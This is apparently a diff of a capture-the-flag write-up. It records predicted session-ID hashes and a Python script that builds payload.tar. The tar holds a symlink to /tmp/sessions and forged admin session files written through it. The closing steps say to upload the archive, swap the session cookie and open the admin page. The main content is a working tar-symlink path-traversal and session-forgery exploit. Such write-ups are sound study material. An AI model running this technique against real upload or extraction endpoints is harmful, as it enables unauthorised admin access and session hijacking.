@@ -125,4 +125,37 @@ result:
 1763721565=> f774d0d5e0c22c9189d733e4eeb22481af0184fec76e05685109508e5baf654c
 1763721566=> 461fdea971ecae95f28ede4e111014d572c6aee4de3f818f502647353d0877f8
 ```
-now make a archive with ways 
+now make a archive with whis sessionID
+```python
+import json
+import subprocess
+from tarfile import TarFile
+
+USERNAME = "test"
+SESSION_IDS = [
+    "2cad9970f56e45c2f5cf9864009b8e2b7216ee80c8e04d79575886ce2eb16c13",
+    "f774d0d5e0c22c9189d733e4eeb22481af0184fec76e05685109508e5baf654c",
+    "461fdea971ecae95f28ede4e111014d572c6aee4de3f818f502647353d0877f8"]
+
+session_data = {
+    "username": USERNAME,
+    "id": 1337,
+    "role": "admin"
+}
+
+with open("session.json", "w") as f:
+    json.dump(session_data, f)
+
+subprocess.run(["ln", "-sfn", "/tmp/sessions", "tmp_link"], check=True)
+
+with TarFile("payload.tar", "w") as tarf:
+    tarf.add("tmp_link")  
+    for sid in SESSION_IDS:
+        tarf.add("session.json", arcname=f"tmp_link/{USERNAME}/{sid}")
+
+print("[+] OK")
+```
+upload our archive and try to change cookie on `test` with `sessionID` what we generated
+and go to `IP/user/admin`![[Pasted image 20251121193655.png]]
+and we solve the challange 
+
